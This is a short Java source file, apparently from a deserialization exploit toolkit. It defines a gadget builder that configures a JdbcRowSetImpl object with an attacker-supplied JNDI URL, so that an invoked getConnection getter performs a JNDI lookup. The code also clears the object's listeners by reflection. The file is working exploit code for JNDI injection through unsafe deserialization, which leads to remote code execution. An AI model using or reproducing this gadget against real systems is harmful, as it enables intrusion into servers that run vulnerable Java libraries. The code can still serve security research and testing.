package xyz.eki.marshalexp.sink.jdk;

import com.sun.rowset.JdbcRowSetImpl;
import xyz.eki.marshalexp.utils.ReflectUtils;

/**
 * getter(getConnection) -> jdni
 */
public class GJdbcRowSetImpl {
    public static Object getEvilJdbcRowSetImpl2Jndi(String jndiUrl) throws  Exception{
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(jndiUrl);
        rs.setMatchColumn("foo");
        ReflectUtils.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
        return rs;
    }
}